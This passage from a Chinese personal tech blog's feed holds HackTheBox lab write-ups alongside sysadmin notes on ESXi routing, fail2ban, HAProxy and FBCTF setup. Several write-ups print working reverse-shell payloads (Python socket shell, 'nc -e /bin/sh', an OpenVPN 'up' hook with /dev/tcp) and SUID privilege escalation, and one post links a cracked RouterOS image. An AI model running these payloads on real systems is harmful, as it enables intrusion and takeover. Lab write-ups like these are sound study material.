simulated attack. It should, however, do the following ahead of the exercise.</p><h4 id="1-Understand-the-controls"><a href="#1-Understand-the-controls" class="headerlink" title="1. Understand the controls"></a>1. Understand the controls</h4><p>What’s most important for blue teams, says Matt Rodgers, head of security strategy, E8 Security, “Especially around phishing and vishing, is the ability to understand what types of controls exist in their environment. I’ve seen people finding controls in their network as they go through an exercise.”</p><h4 id="2-Make-sure-you-can-collect-and-analyze-the-data"><a href="#2-Make-sure-you-can-collect-and-analyze-the-data" class="headerlink" title="2. Make sure you can collect and analyze the data"></a>2. Make sure you can collect and analyze the data</h4><p>Because blue teams base their function off their ability to collect and make use of the data they collect, log management tools, like Splunk, are important tools. Rodgers says, “Another piece of the puzzle is understanding how to collect all the data of what the team has done and record it in a high enough fidelity in postmortem exercises to determine what they did right or wrong and how to do it better.”</p><h4 id="3-Use-the-tools-appropriate-for-the-environment"><a href="#3-Use-the-tools-appropriate-for-the-environment" class="headerlink" title="3. Use the tools appropriate for the environment"></a>3. Use the tools appropriate for the environment</h4><p>The tools that blue teams need is determined by their environments. “They need to ask <em>‘<em>What is this program doing? Why would it try to format your hard drive?</em>‘</em> and then add technology that blocks unanticipated actions. The tools to test whether that technology was successful come from the red team,” said Michael Angelo, chief security architect, Micro Focus.</p><h4 id="4-Have-experienced-members-on-the-team"><a href="#4-Have-experienced-members-on-the-team" class="headerlink" title="4. Have experienced members on the team"></a>4. Have experienced members on the team</h4><p>For the blue team, what is most valuable is the knowledge that people have in addition to tools. Angelo said, “As you get used to doing these things, you start to think, ‘I’ve seen that, I’ve seen that, they do this, they do that, but I wonder if there isn’t a hole.’ If you only prepare for the things that are known, then you won’t be prepared for the unknown.”</p><h4 id="5-Assume-there-will-be-failures"><a href="#5-Assume-there-will-be-failures" class="headerlink" title="5. Assume there will be failures"></a>5. Assume there will be failures</h4><p>Asking questions is an invaluable tool that will encourage exploration into the unknown. Angelo said, “Don’t stop at preparing for the things that exist today. Assume there will be failures in your infrastructure.”</p><p>That assumption, that there will be failures, that nothing is 100 percent secure, that we can no more create perfect children than we can perfect security might be the greatest tool anyone can find.</p><p><strong>More on penetration testing and ethical hacking:</strong></p><ul><li><a href="https://www.csoonline.com/article/2943524/17-penetration-testing-tools-the-pros-use.html">17 penetration testing tools the pros use</a></li><li><a href="https://www.csoonline.com/article/3230444/certifications/the-best-ethical-hacking-courses-and-certifications.html">The best ethical hacking courses and certifications</a></li><li><a href="https://www.csoonline.com/article/2622078/hacking/penetration-testing-on-the-cheap-and-not-so-cheap.html">Penetration testing on the cheap and not so cheap</a></li><li><a href="https://www.csoonline.com/article/2944967/network-security/10-steps-to-managing-a-successful-network-penetration-test.html">10 steps to managing a successful network penetration test</a></li><li><a href="https://www.csoonline.com/article/2921148/security/whats-the-difference-between-a-vulnerability-scan-penetration-test-and-a-risk-analysis.html">What’s the difference between a vulnerability scan, penetration test and a risk analysis?</a></li><li><a href="https://www.csoonline.com/article/2133330/social-engineering/social-engineering-in-penetration-tests-6-tips-for-ethical-and-legal-use.html?nsdr=true">Social engineering in penetration tests: 6 tips for ethical (and legal) use</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 红蓝队 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.68 Bashed</title>
      <link href="b1de36fce3a7/"/>
      <url>b1de36fce3a7/</url>
      
        <content type="html"><![CDATA[<p>Nmap扫出来就开了一个80端口。<br>网站打开发现有一篇讲phpbash的文章，文章中提到这个站点也部署了phpbash。<br>而这个phpbash就是他的名字的意思，一个php文件，可以当做一个远程bash shell用。<br>dirbuster扫出来发现有一个dev耳机目录，试一试phpbash是不是在里面。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190406020416.png"></p><p>直接用python反弹一个shell回去。<br>这时候已经可以读取user.txt了。<br>LinEnum运行一下，发现sudo有点问题。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190406020522.png"></p><p>发现可以以scriptmanager的身份运行sudo而不需要输入密码。<br><code>sudo -u scriptmanager bash -i</code><br>运行之后就是scriptmanager的身份了。<br>在根目录发现一个script文件夹，里面有一个test.py和test.txt</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190406020928.png"></p><p>直接把test.py内容换成反弹shell的，就可以获得root shell了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);</span><br><span class="line">s.connect((&quot;10.10.14.40&quot;,4442));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1); </span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call(\[&quot;/bin/sh&quot;,&quot;-i&quot;\])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.117 Irked</title>
      <link href="a35430a9254a/"/>
      <url>a35430a9254a/</url>
      
        <content type="html"><![CDATA[<p>nmap初步扫描发现开了22和80，111这三个端口。</p><p>访问80提示 IRC is almost working!</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720190321180252.png"></p><p>感觉似乎有其他的端口，同时web目录扫描也没发现其他有用的页面。</p><p>nmap重新扫一下发现存在其他端口</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190321180444.png"></p><p>searchsploit unrealirc直接发现一个RCE，可以得到一个低级的shell。</p><p>在djmardov这个用户的documents目录下面发现.backup文件</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720190321180748.png"></p><p> </p><p>里面有两行话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Super elite steg backup pw</span><br><span class="line">UPupDOWNdownLRlrBAbaSSss</span><br></pre></td></tr></table></figure><p>然而第二行并不是该用户的ssh密码。</p><p>看了论坛才知道，steg是stego隐写的意思。差评，垃圾CTF隐写套路。</p><p>下载stegohide之后输入第二行密码解密，得到  <code>Kab6h+m+bbp2J:HG</code></p><p>这个就是ssh密码，ssh登陆上去，就可以cat user.txt了。</p><p>之后的提权是通过SUID查的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null -exec ls -l &#123;&#125; \\;</span><br></pre></td></tr></table></figure><p>发现了一个可疑的viewuser程序</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190321181310.png"></p><p>运行提示 /tmp/listusers 不存在</p><p>手动创建一个，里面输入cat /etc/shadow然后运行viewuser</p><p>发现成功返回了shadow文件内容，直接加一行 nc -vn 10.10.14.40 5555 -e /bin/sh</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190321181651.png"></p><p>完事，垃圾box，差评</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.79 Valentine</title>
      <link href="ef0e6f83ef44/"/>
      <url>ef0e6f83ef44/</url>
      
        <content type="html"><![CDATA[<p>首先跑一下nmap扫描</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190322041650.png"></p><p>开放了http和https服务，上去看一下。<br>发现存在几个页面，<code>/dev /encode /decode</code><br>发现dev下面存在两个文件。<br>notes.txt</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190322043655.png"></p><p>hype_key是一个hex格式的ssh密匙文件，但是加了密，需要另外一个密码口令。</p><p>重新跑一遍full nmap scan发现443端口openssl存在heartbleed等一系列漏洞。</p><p>下个poc利用一下，发现存在一个很可疑的字符串。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190322044128.png"></p><p>判断应该是base64加密的，解密得到 <code>heartbleedbelievethehype</code></p><p>尝试ssh连上去(用户名不是dev，是hype_key的hype)</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190322044656.png"></p><p>跑一下enum脚本，发现正在运行的进程中发现有趣的信息。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190322044938.png"></p><p>发现后台跑着一个tmux，而且是有root权限的。</p><p><code>tmux -S /.devs/dev\_sess</code></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190322045137.png"></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.109 Vault</title>
      <link href="baac564af5c4/"/>
      <url>baac564af5c4/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190320062708.png"></p><p>Linux机子，开放了22和80端口</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190320062805.png"></p><p>web界面如图，按照信息提示可以推断10.10.10.109/sparklays下面应该存在内容</p><p>访问提示forbidden. 用dirbuster扫一下目录.</p><p>第一次扫描结果显示存在admin.php和login.php以及一个design目录,暴力猜解密码没有作用，再尝试扫一下design下面的目录.发现存在changelogo.php design.html和一个uploads目录</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190320073549.png"></p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720190320064446.png"></p><p>尝试上传.php和.PHP文件，都不行，可以.php5绕过，然后在uploads目录里面访问这个php</p><p>得到一个shell,发现用户dave的目录下面存在3个文件.</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190320065136.png"></p><p>尝试ssh上去，发现可以。</p><p>同时发现Servers文件里面有俩IP地址，尝试一下这俩ip是不是开放了80或者22这种端口。</p><p>结果发现192.168.122.4开放了80和22，192.168.122.5俩都没开放。</p><p>这时候端口forward把192.168.122.4的80端口转发给本地访问一下试试.</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190320065628.png"></p><p>发现存在一个vpn的configuration界面和dns setting界面</p><p>后者打不开，前者打得开。</p><p>后者打开之后，是一个可以执行ovpn文件的网页，同时扫描发现/notes下面存在一个123.ovpn的配置文件.直接把123.ovpn放到里面执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">remote 192.168.122.1</span><br><span class="line">dev tun</span><br><span class="line">nobind</span><br><span class="line">script-security 2</span><br><span class="line">up &quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.122.1/2323 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190320073320.png"></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190320073827.png"></p><p>user.txt拿到了</p><p>在/var/log/auth.log中可以发现登录192.168.5.2的方法</p><p><img src="https://upload-/images.jianshu.io/upload_/images/14978536-750114402e6b9d62.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp"></p><p>首先运行 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setsid ncat -l 8888 --sh-exec &quot;ncat 192.168.5.2 987 --source-port=4444&quot; </span><br></pre></td></tr></table></figure><p>让本地8888端口于远程987端口建立转发，并通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh dave@localhost -p 8888</span><br></pre></td></tr></table></figure><p>登录目标，获取一个普通用户权限shell</p><p><img src="https://upload-/images.jianshu.io/upload_/images/14978536-fba6f7f5890e5687.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/853/format/webp"></p><p>在主机上发现一处敏感文件/home/dave/root.txt.gpg，显然最后的flag经过加密，而我们在第三步已经获取了key，可以用于解密，那么需要做的就是拷贝回来，因此在DNS主机上运行<br><code>scp -P 5555 dave@localhost:/home/dave/root.txt.gpg /tmp</code><br>最后拷贝回ubuntu主机<br><code>scp dave@192.168.122.4:/tmp/root.txt.gpg /tmp</code></p><p>利用key里的密钥解密获得root flag</p><p><img src="https://upload-/images.jianshu.io/upload_/images/14978536-24cd1d12da9bf3ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/868/format/webp"></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>优化升级reverse shell</title>
      <link href="0c9bd3c614fe/"/>
      <url>0c9bd3c614fe/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>然后ctrl+z把进程停止了，然后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure><p>这时候你的输入是看不见的，然后输入fg %进程ID，回车</p><p>然后shell就升级完成了，可以使用tab和vim这种。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>物理服务器虚拟化组网 Esxi 6.7+ROS 6.4.38</title>
      <link href="50fbbfd9bb98/"/>
      <url>50fbbfd9bb98/</url>
      
        <content type="html"><![CDATA[<p>缘由：为什么想要通过虚拟化一台路由器出来组网呢，很简单，因为没钱。一台配置稍好的企业级路由器价格直接大几千，当然买不起，而通过Esxi虚拟化一台x86的软路由出来不仅性能可以很高，而且零成本。</p><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>安装好Esxi，可以通过把ros的镜像烧到U盘里面来安装Esxi。</p><p>烧录工具：<a href="http://wp.jinzz.cc/wp-content/uploads/2019/02/rufus-3.4p.zip">rufus-3.4p</a></p><p>ROS破解授权镜像(不破解的话ROS只有24小时试用，切记不能更改硬盘大小)：<a href="http://wp.jinzz.cc/wp-content/uploads/2019/02/MikroTik-RouterOS-6.43.8.7z">MikroTik RouterOS 6.43.8</a></p><p>没啥好说，插上服务器，BIOS里面BOOT到USB，安装Esxi。</p><p>然后推荐在本地创建好ROS的虚拟机然后上载到Esxi。</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20190228004304.png"></p><p>上载完成之后，配置Esxi里面好相关的网络端口组和虚拟交换机。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190228004538.png"></p><p>配置虚拟交换机的时候记得指定好物理端口，指定的物理端口就是WAN口网线要插的位置。</p><p>最好把安全选项卡里面的三个都点成接受。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190228004756.png"></p><p>然后再添加两个端口组，一个LAN和一个WAN，LAN可以直接指定成默认的vSwith交换机，WAN指定成刚刚新创建的，然后VLANID一定要和Management Network指定成一样的，要不然会出现Esxi主机无法连上虚拟的ROS，导致没法远程管理Esxi主机。</p><p>然后启动ROS，记得配置上新创建的俩网络适配器。需要通过命令行配置几个基本的命令。</p><p>/int print #查看网络接口,如果不知道哪个是WAN哪个是LAN可以查看MAC地址或者WAN和LAN分两次配给ROS<br>ip address add address=182.148.123.123/30 interface=ether1   #设置WAN口IP地址为182.148.123.123,掩码为30<br>ip route add gateway=182.148.123.122    #设置默认网关为182.148.123.122</p><p>ip address add address=192.168.88.1/24 interface=ether2 #设LAN口IP地址为192.168.88.1，掩码为24</p><p>这个时候就配置好一半了，然后可以通过winbox连上ROS来吧ether1和ether2名字改成WAN和LAN。</p><p>然后再新建一个网桥bridge。</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20190228005820.png"></p><p>然后再把/ip address里面的192.168.88.1/24的接口改成新建的bridge。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190228010009.png"></p><p>这样就能够把LAN和WAN连接起来，再新建好/ip firewall nat 里面的masquerade规则，内网的虚拟机就能正常nat和上网了。</p><p>然后在到Esxi的管理界面，把Esxi的IP设置成192.168.88.2，然后测试一下能不能ping通192.168.88.1和外网IP和域名，如果可以，那就配置完成了。</p><p>之后新建的虚拟机把网络适配器都指定成LAN口，连接到的就是ROS管理的内网了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安装fail2ban + Firewalld防止爆破与CC攻击</title>
      <link href="5b9bae51d637/"/>
      <url>5b9bae51d637/</url>
      
        <content type="html"><![CDATA[<p>fail2ban可以监视你的系统日志，然后匹配日志的错误信息执行相应的屏蔽动作。网上大部分教程都是关于fail2ban + iptables组合，考虑到CentOS 7已经自带Firewalld，并且使用Firewalld作为网络防火墙更加简单方便，分享下fail2ban + Firewalld使用方法。</p><p>检查Firewalld是否启用</p><p>#如果您已经安装iptables建议先关闭<br>service iptables stop<br>#查看Firewalld状态<br>firewall-cmd –state<br>#启动firewalld<br>systemctl start firewalld<br>#设置开机启动<br>systemctl enable firewalld.service</p><p>启用Firewalld后会禁止所有端口连接，因此请务必放行常用的端口，以免被阻挡在外，以下是放行SSH端口（22）示例，供参考：</p><p>#放行22端口<br>firewall-cmd –zone=public –add-port=80/tcp –permanent<br>#重载配置<br>firewall-cmd –reload<br>#查看已放行端口<br>firewall-cmd –zone=public –list-ports</p><p>安装fail2ban fail2ban可以监控系统日志，并且根据一定规则匹配异常IP后使用Firewalld将其屏蔽，尤其是针对一些爆破/扫描等非常有效。</p><p>#CentOS内置源并未包含fail2ban，需要先安装epel源<br>yum -y install epel-release<br>#安装fial2ban<br>yum -y install fail2ban</p><p>安装成功后fail2ban配置文件位于/etc/fail2ban，其中jail.conf为主配置文件，相关的匹配规则位于filter.d目录，其它目录/文件一般很少用到，如果需要详细了解可自行搜索。</p><p>配置规则 新建jail.local来覆盖fail2ban的一些默认规则：</p><p>#新建配置</p><p>vim /etc/fail2ban/jail.local</p><p> </p><p>#默认配置<br>[DEFAULT]<br>ignoreip = 127.0.0.1/8<br>bantime = 86400<br>findtime = 600<br>maxretry = 5<br>#这里banaction必须用firewallcmd-ipset,这是fiewalll支持的关键，如果是用Iptables请不要这样填写<br>banaction = firewallcmd-ipset<br>action = %(action_mwl)s</p><p>ignoreip：IP白名单，白名单中的IP不会屏蔽，可填写多个以（,）分隔 bantime：屏蔽时间，单位为秒（s） findtime：时间范围 maxretry：最大次数 banaction：屏蔽IP所使用的方法，上面使用firewalld屏蔽端口 防止SSH爆破 如果您还在使用默认SSH端口（22），可能每天都会被扫描，强烈建议先参考《Linux服务器之登录安全》加强服务器防护，或者可以使用fail2ban将恶意IP屏蔽。</p><p>继续修改jail.local这个配置文件，在后面追加如下内容：</p><p>[sshd]<br>enabled = true<br>filter = sshd<br>port = 22<br>action = %(action_mwl)s<br>logpath = /var/log/secure</p><p>[sshd]：名称，可以随便填写 filter：规则名称，必须填写位于filter.d目录里面的规则，sshd是fail2ban内置规则 port：对应的端口 action：采取的行动 logpath：需要监视的日志路径 到这一步，我们jail.local的规则看起来可能像下面这样子：</p><p>[DEFAULT]<br>ignoreip = 127.0.0.1/8<br>bantime = 86400<br>findtime = 600<br>maxretry = 5<br>banaction = firewallcmd-ipset<br>action = %(action_mwl)s</p><p>[sshd]<br>enabled = true<br>filter = sshd<br>port = 22<br>action = %(action_mwl)s<br>logpath = /var/log/secure</p><p>上面的配置意思是如果同一个IP，在10分钟内，如果连续超过5次错误，则使用Firewalld将他IP ban了。输入systemctl start fail2ban启动fail2ban来试试效果。</p><p>使用另一台服务器不断尝试连接SSH，并且不断的将密码输入错误，你会发现连续超过5次后直接连不上，说明IP被ban了，可以输入：fail2ban-client status sshd查看被ban的IP，如下截图。</p><p>防止CC攻击 这里仅以Nginx为例，使用fail2ban来监视nginx日志，匹配短时间内频繁请求的IP，并使用firewalld将其IP屏蔽，达到CC防护的作用。</p><p>#需要先新建一个nginx日志匹配规则<br>vi /etc/fail2ban/filter.d/nginx-cc.conf<br>#填写如下内容<br>[Definition]<br>failregex = <HOST> -.*- .*HTTP/1.* .* .*$<br>ignoreregex =</p><p>继续修改vim /etc/fail2ban/jail.local追加如下内容：</p><p>[nginx-cc]<br>enabled = true<br>port = http,https<br>filter = nginx-cc<br>action = %(action_mwl)s<br>maxretry = 20<br>findtime = 60<br>bantime = 3600<br>logpath = /usr/local/nginx/logs/access.log</p><p>上面的配置意思是如果在60s内，同一IP达到20次请求，则将其IP ban 1小时，上面只是为了测试，请根据自己的实际情况修改。logpath为nginx日志路径。</p><p>防止Wordpress爆破 如果您经常分析日志会发现有大量机器人在扫描wordpress登录页面wp-login.php，虽然对方可能没成功，但是为了避免万一还是将他IP干掉为好。</p><p>#需要先新建一个nginx日志匹配规则<br>vi /etc/fail2ban/filter.d/wordpress.conf<br>#填写如下内容<br>[Definition]<br>failregex = ^<HOST> -.* /wp-login.php.* HTTP/1\..”<br>ignoreregex =<br>继续修改jail.local追加如下内容：</p><p>[wordpress]<br>enabled = true<br>port = http,https<br>filter = wordpress<br>action = %(action_mwl)s<br>maxretry = 20<br>findtime = 60<br>bantime = 3600<br>logpath = /usr/local/nginx/logs/access.log</p><p>当然，别忘记输入systemctl restart fail2ban重启fail2ban使其生效。</p><p>常用命令 #启动 systemctl start fail2ban #停止 systemctl stop fail2ban #开机启动 systemctl enable fail2ban #查看被ban IP，其中sshd为名称，比如上面的[wordpress] fail2ban-client status sshd #删除被ban IP fail2ban-client set sshd delignoreip 192.168.111.111 #查看日志 tail /var/log/fail2ban.log 总结 fail2ban已经内置很多匹配规则，位于filter.d目录下，包含了常见的SSH/FTP/Nginx/Apache等日志匹配，如果都还无法满足您的需求，您也可以自行新建规则来匹配异常IP。使用fail2ban + Firewalld来阻止恶意IP是行之有效的办法，可极大提高服务器安全。</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SS节点国内中继</title>
      <link href="e877256ac5b9/"/>
      <url>e877256ac5b9/</url>
      
        <content type="html"><![CDATA[<p>寒假回家，家里的移动宽带连接到学校电信骨干网的机房莫名其妙的丢包，连接缓慢，最近正好玩到了的Haproxy可以用来改善解决这个问题。</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20190114204008.png"></p><p>yum库里直接有haproxy，可以直接</p><p>yum -y install haproxy</p><p>配置文件在/etc/haproxy/haproxy.cfg</p><p>global<br>    ulimit-n  51200</p><p>defaults<br>    log     global<br>    mode    tcp<br>    option  dontlognull<br>    timeout connect 5000<br>    timeout client  50000<br>    timeout server  50000</p><p>frontend ss-in<br>    bind *:23333<br>    default_backend ss-out</p><p>backend ss-out<br>    server ss1 47.244.119.145:23333 maxconn 20480</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Haproxy 反向代理 负载均衡</title>
      <link href="ec610fdff917/"/>
      <url>ec610fdff917/</url>
      
        <content type="html"><![CDATA[<p>参考链接：</p><p><a href="https://www.cnblogs.com/Richardzhu/p/3344676.html">https://www.cnblogs.com/Richardzhu/p/3344676.html</a></p><p><a href="https://blog.csdn.net/sj349781478/article/details/78862315">https://blog.csdn.net/sj349781478/article/details/78862315</a></p><p><a href="https://www.cnblogs.com/paul8339/p/8042776.html">https://www.cnblogs.com/paul8339/p/8042776.html</a></p><p> </p><p>附上我的配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@node1 ~]# cat /etc/haproxy/haproxy.cfg </span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># Example configuration for a possible web application.  See the</span><br><span class="line"># full configuration options online.</span><br><span class="line">#</span><br><span class="line">#   http://haproxy.1wt.eu/download/1.4/doc/configuration.txt</span><br><span class="line">#</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># Global settings</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line">global</span><br><span class="line">    # to have these messages end up in /var/log/haproxy.log you will</span><br><span class="line">    # need to:</span><br><span class="line">    #</span><br><span class="line">    # 1) configure syslog to accept network log events.  This is done</span><br><span class="line">    #    by adding the &#x27;-r&#x27; option to the SYSLOGD\_OPTIONS in</span><br><span class="line">    #    /etc/sysconfig/syslog</span><br><span class="line">    #</span><br><span class="line">    # 2) configure local2 events to go to the /var/log/haproxy.log</span><br><span class="line">    #   file. A line like the following can be added to</span><br><span class="line">    #   /etc/sysconfig/syslog</span><br><span class="line">    #</span><br><span class="line">    #    local2.*                       /var/log/haproxy.log</span><br><span class="line">    #</span><br><span class="line">    log         127.0.0.1 local2</span><br><span class="line"></span><br><span class="line">    chroot      /var/lib/haproxy</span><br><span class="line">    pidfile     /var/run/haproxy.pid</span><br><span class="line">    maxconn     4000</span><br><span class="line">    user        haproxy</span><br><span class="line">    group       haproxy</span><br><span class="line">    daemon</span><br><span class="line"></span><br><span class="line">    # turn on stats unix socket</span><br><span class="line">    stats socket /var/lib/haproxy/stats</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># common defaults that all the &#x27;listen&#x27; and &#x27;backend&#x27; sections will</span><br><span class="line"># use if not designated in their block</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line">defaults</span><br><span class="line">    mode                    tcp</span><br><span class="line">    log                     global</span><br><span class="line">    option                  tcplog</span><br><span class="line">    option                  dontlognull</span><br><span class="line">    option http-server-close</span><br><span class="line">    option forwardfor</span><br><span class="line">    option                  redispatch</span><br><span class="line">    retries                 3</span><br><span class="line">    timeout http-request    10s</span><br><span class="line">    timeout queue           1m</span><br><span class="line">    timeout connect         10s</span><br><span class="line">    timeout client          1m</span><br><span class="line">    timeout server          1m</span><br><span class="line">    timeout http-keep-alive 10s</span><br><span class="line">    timeout check           10s</span><br><span class="line">    maxconn                 3000</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># haproxy监听图形化界面</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">listen admin_stats </span><br><span class="line">stats enable </span><br><span class="line">        bind *:888 #监听端口  </span><br><span class="line">mode http</span><br><span class="line">        option httplog #采用http日志格式  </span><br><span class="line">log global</span><br><span class="line">maxconn 10</span><br><span class="line">        stats refresh 30s #统计页面自动刷新时间  </span><br><span class="line">        stats uri /stats #统计页面url  </span><br><span class="line">        stats realm Haproxy Manager #统计页面密码框上提示文本  </span><br><span class="line">        stats auth admin:password #统计页面用户名和密码设置  </span><br><span class="line">        stats hide-version #隐藏统计页面上HAProxy的版本信息  </span><br><span class="line">stats admin if TRUE</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># 需要代理的端口和服务</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line">frontend  http *:80</span><br><span class="line">    default_backend             web_server_http</span><br><span class="line"></span><br><span class="line">frontend  http2 *:88</span><br><span class="line">    default_backend             web_server_http2</span><br><span class="line"></span><br><span class="line">frontend  https *:443</span><br><span class="line">    default_backend             web_server_https</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line"># 后端负载均衡服务器列表</span><br><span class="line">#---------------------------------------------------------------------</span><br><span class="line">backend web_server_http</span><br><span class="line">    balance     roundrobin</span><br><span class="line">    server   web1   182.148.157.242:8000</span><br><span class="line"></span><br><span class="line">backend web_server_http2</span><br><span class="line">    balance     roundrobin</span><br><span class="line">    server   web1   182.148.157.242:8800</span><br><span class="line"></span><br><span class="line">backend web_server_https</span><br><span class="line">    balance     roundrobin</span><br><span class="line">    server   web1   182.148.157.242:44300</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FBCTF平台部署</title>
      <link href="5bd8a37267bb/"/>
      <url>5bd8a37267bb/</url>
      
        <content type="html"><![CDATA[<p>需要的操作系统版本为Ubuntu 16.04</p><p>因为安装的时候一些依赖和文件在国内网络环境中皆已被污染和劫持，所以需要全程挂代理。</p><h3 id="STEP1：代理环境"><a href="#STEP1：代理环境" class="headerlink" title="STEP1：代理环境"></a>STEP1：代理环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>先配置好正确的apt下载源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties</span><br><span class="line">deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security 